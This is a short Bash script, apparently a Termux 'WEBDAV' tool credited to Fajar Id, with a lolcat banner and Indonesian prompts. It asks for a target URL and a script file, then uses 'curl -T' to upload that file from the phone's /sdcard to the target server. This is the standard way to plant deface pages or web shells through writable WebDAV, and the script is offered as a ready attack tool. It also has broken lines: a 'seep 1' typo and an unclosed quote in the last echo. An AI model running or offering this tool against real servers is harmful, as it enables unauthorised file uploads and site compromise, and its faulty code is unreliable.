clear
figlet '    WEBDAV' | lolcat
echo "    <=====================[]====================>" | lolcat
echo "    <=====[       Tools By Fajar Id       ]=====>" | lolcat
echo  "   <=====[       Facebook Fajar Id       ]=====>" | lolcat
echo "    <=====================[]====================>" | lolcat
sleep 1
read -p "Masukan Target =>" target;
read -p "Masukan Nama Scriptnya =>" script;
sleep 1
echo "Proses.."
curl -T /sdcard/$script $target
seep 1
echo ' [*] => Selesai 
sleep 2
